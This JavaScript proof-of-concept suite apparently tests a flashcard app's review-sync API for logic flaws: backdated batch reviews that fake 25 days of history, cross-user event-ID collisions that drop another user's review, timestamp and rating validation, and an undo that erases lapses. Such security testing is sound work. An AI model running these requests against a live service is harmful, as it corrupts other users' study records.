// PoC 02: FSRS & Flashcard Abuse Test Suite
const { BASE_URL, registerTestUser, authHeaders } = require('./common');
const crypto = require('crypto');

async function createFlashcard(user, title = 'Test Card FSRS') {
  const res = await fetch(`${BASE_URL}/flashcards`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      frontText: `Khái niệm ${title}: Bảng trang là gì?`,
      backText: 'Bảng trang là cấu trúc dữ liệu ánh xạ địa chỉ ảo sang địa chỉ vật lý.',
      cardType: 'standard'
    })
  });
  return await res.json();
}

async function testFuturePastTimestamps(user, card) {
  console.log('\n--- 2.1 Testing Future / Past Timestamps Validation ---');
  const serverNow = new Date();

  // Test 1: Future timestamp +9 mins (within +10m tolerance)
  const timePlus9m = new Date(serverNow.getTime() + 9 * 60 * 1000).toISOString();
  const event1Id = crypto.randomUUID();
  const r1 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: event1Id,
        flashcardId: card.id,
        rating: 3,
        clientTimestamp: timePlus9m,
        reviewDurationMs: 1500
      }]
    })
  });
  const data1 = await r1.json();
  const futureAcceptedWithoutClamp = data1.results?.[0]?.futureClamped === false;
  console.log(`Review +9 mins in future: status=${r1.status}, futureClamped=${data1.results?.[0]?.futureClamped}`);

  // Test 2: Future timestamp +2 hours (> +10m tolerance)
  const timePlus2h = new Date(serverNow.getTime() + 2 * 3600 * 1000).toISOString();
  const event2Id = crypto.randomUUID();
  const r2 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: event2Id,
        flashcardId: card.id,
        rating: 3,
        clientTimestamp: timePlus2h,
        reviewDurationMs: 1500
      }]
    })
  });
  const data2 = await r2.json();
  const futureClamped = data2.results?.[0]?.futureClamped === true;
  console.log(`Review +2 hours in future: status=${r2.status}, futureClamped=${futureClamped}`);

  // Test 3: Past timestamp -29 days (within -30d tolerance)
  const timePast29d = new Date(serverNow.getTime() - 29 * 24 * 3600 * 1000).toISOString();
  const event3Id = crypto.randomUUID();
  const r3 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: event3Id,
        flashcardId: card.id,
        rating: 4,
        clientTimestamp: timePast29d,
        reviewDurationMs: 2000
      }]
    })
  });
  const data3 = await r3.json();
  console.log(`Review -29 days in past: status=${r3.status}, syncedCount=${data3.syncedCount}`);

  // Test 4: Past timestamp -35 days (> -30d tolerance, should be rejected)
  const timePast35d = new Date(serverNow.getTime() - 35 * 24 * 3600 * 1000).toISOString();
  const event4Id = crypto.randomUUID();
  const r4 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: event4Id,
        flashcardId: card.id,
        rating: 4,
        clientTimestamp: timePast35d,
        reviewDurationMs: 2000
      }]
    })
  });
  const data4 = await r4.json();
  console.log(`Review -35 days in past: status=${r4.status}, error=${data4.error}`);

  return {
    futureAcceptedWithoutClamp,
    futureClamped,
    past29dAccepted: r3.status === 200,
    past35dRejected: r4.status === 400
  };
}

async function testOfflineReplayFakeHistory(user) {
  console.log('\n--- 2.2 Testing Offline Replay Fake History (30 Reviews in 1 Batch) ---');
  const card = await createFlashcard(user, 'Farmed Card');
  const now = Date.now();
  const batchReviews = [];

  // Generate 25 reviews spaced 1 day apart in the past
  for (let i = 25; i >= 1; i--) {
    const timestamp = new Date(now - i * 86400000).toISOString();
    batchReviews.push({
      reviewEventId: crypto.randomUUID(),
      flashcardId: card.id,
      rating: 4, // Easy
      clientTimestamp: timestamp,
      reviewDurationMs: 1200
    });
  }

  const res = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({ reviews: batchReviews })
  });

  const data = await res.json();
  console.log(`Batch sync status: ${res.status}, syncedCount=${data.syncedCount}, userActivated=${data.userActivated}`);

  // Fetch updated card state
  const dueCardsRes = await fetch(`${BASE_URL}/flashcards/due?includeAll=true`, {
    headers: authHeaders(user.accessToken)
  });
  const dueCards = await dueCardsRes.json();
  const updatedCard = dueCards.find(c => c.id === card.id);

  console.log(`Farmed Card Stats: reps=${updatedCard.reps}, stability=${updatedCard.stability}, state=${updatedCard.state}, dueAt=${updatedCard.dueAt}`);
  console.log(`VULNERABILITY CONFIRMED: User instantly faked 25 days of learning history in 1 request! Reps=${updatedCard.reps}, Stability=${updatedCard.stability}`);

  return {
    test: 'offline_replay_fake_history',
    repsFarmed: updatedCard.reps,
    stabilityFarmed: updatedCard.stability,
    userActivated: data.userActivated
  };
}

async function testReplaySameReviewEventId(user1, user2) {
  console.log('\n--- 2.3 Testing Replay Same ReviewEventId (Idempotency & Cross-User Denial of Service) ---');
  const card1 = await createFlashcard(user1, 'User 1 Card');
  const card2 = await createFlashcard(user2, 'User 2 Card');
  const sharedReviewEventId = crypto.randomUUID();

  // User 1 sends review with sharedReviewEventId
  const r1 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user1.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: sharedReviewEventId,
        flashcardId: card1.id,
        rating: 3,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1000
      }]
    })
  });
  const data1 = await r1.json();
  console.log(`User 1 submit review: status=${r1.status}, duplicate=${data1.results?.[0]?.idempotentDuplicate}`);

  // User 1 replays EXACT SAME reviewEventId
  const r1Replay = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user1.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: sharedReviewEventId,
        flashcardId: card1.id,
        rating: 4, // different rating
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 2000
      }]
    })
  });
  const data1Replay = await r1Replay.json();
  console.log(`User 1 replay same eventId: duplicate=${data1Replay.results?.[0]?.idempotentDuplicate}`);

  // User 2 sends review with THE SAME reviewEventId (belonging to User 1)
  const r2 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user2.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: sharedReviewEventId,
        flashcardId: card2.id,
        rating: 4,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1500
      }]
    })
  });
  const data2 = await r2.json();
  const crossUserCollision = data2.results?.[0]?.idempotentDuplicate === true;
  console.log(`User 2 submit with User 1's eventId: status=${r2.status}, duplicate=${data2.results?.[0]?.idempotentDuplicate}`);
  console.log(`CRITICAL VULNERABILITY: User 2's review was ignored due to cross-user ReviewEventId collision: ${crossUserCollision}`);

  return {
    test: 'review_event_id_idempotency_and_cross_user',
    user1Idempotent: data1Replay.results?.[0]?.idempotentDuplicate === true,
    crossUserCollision
  };
}

async function testAbnormalRating(user) {
  console.log('\n--- 2.4 Testing Abnormal Rating & Negative Duration ---');
  const card = await createFlashcard(user, 'Rating Validation Card');

  // Rating = 0
  const r0 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: crypto.randomUUID(),
        flashcardId: card.id,
        rating: 0,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1000
      }]
    })
  });
  console.log(`Rating 0 rejected: status=${r0.status} (expected 400)`);

  // Rating = 5
  const r5 = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: crypto.randomUUID(),
        flashcardId: card.id,
        rating: 5,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1000
      }]
    })
  });
  console.log(`Rating 5 rejected: status=${r5.status} (expected 400)`);

  // Negative duration
  const rNeg = await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: crypto.randomUUID(),
        flashcardId: card.id,
        rating: 3,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: -500
      }]
    })
  });
  console.log(`Negative duration rejected: status=${rNeg.status} (expected 400)`);

  return {
    rating0Rejected: r0.status === 400,
    rating5Rejected: r5.status === 400,
    negativeDurationRejected: rNeg.status === 400
  };
}

async function testInfiniteUndoExploit(user) {
  console.log('\n--- 2.5 Testing Infinite Undo Exploit ---');
  const card = await createFlashcard(user, 'Undo Exploit Card');

  // Submit Rating 1 (Again - failure)
  await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: crypto.randomUUID(),
        flashcardId: card.id,
        rating: 1,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1000
      }]
    })
  });

  // Call undo
  const undoRes = await fetch(`${BASE_URL}/flashcards/${card.id}/undo-last-review`, {
    method: 'POST',
    headers: authHeaders(user.accessToken)
  });
  const undoData = await undoRes.json();
  console.log(`Undo response: status=${undoRes.status}, reps=${undoData.reps}, stability=${undoData.stability}`);

  // Now submit Rating 4 (Easy)
  await fetch(`${BASE_URL}/flashcards/sync-reviews`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      reviews: [{
        reviewEventId: crypto.randomUUID(),
        flashcardId: card.id,
        rating: 4,
        clientTimestamp: new Date().toISOString(),
        reviewDurationMs: 1000
      }]
    })
  });

  // Check state: failure was erased completely!
  const dueRes = await fetch(`${BASE_URL}/flashcards/due?includeAll=true`, {
    headers: authHeaders(user.accessToken)
  });
  const due = await dueRes.json();
  const finalCard = due.find(c => c.id === card.id);
  console.log(`After Undo + Easy: reps=${finalCard.reps}, lapses=${finalCard.lapses}, stability=${finalCard.stability}`);
  console.log(`VULNERABILITY: User erased lapses count and kept 100% retention by undoing failure: lapses=${finalCard.lapses}`);

  return {
    test: 'undo_erases_failure',
    lapsesRemaining: finalCard.lapses,
    stability: finalCard.stability
  };
}

async function main() {
  console.log('=== STARTING POC-02: FSRS & FLASHCARD ABUSE SUITE ===');
  const user1 = await registerTestUser(`fsrs-user1-${Date.now().toString().slice(-4)}`);
  const user2 = await registerTestUser(`fsrs-user2-${Date.now().toString().slice(-4)}`);
  const testCard = await createFlashcard(user1, 'Base Test Card');

  const r1 = await testFuturePastTimestamps(user1, testCard);
  const r2 = await testOfflineReplayFakeHistory(user1);
  const r3 = await testReplaySameReviewEventId(user1, user2);
  const r4 = await testAbnormalRating(user1);
  const r5 = await testInfiniteUndoExploit(user1);

  console.log('\n=== SUMMARY OF POC-02 FINDINGS ===');
  console.log(JSON.stringify({ r1, r2, r3, r4, r5 }, null, 2));
}

main().catch(err => {
  console.error('Fatal error in poc-02:', err);
  process.exit(1);
});
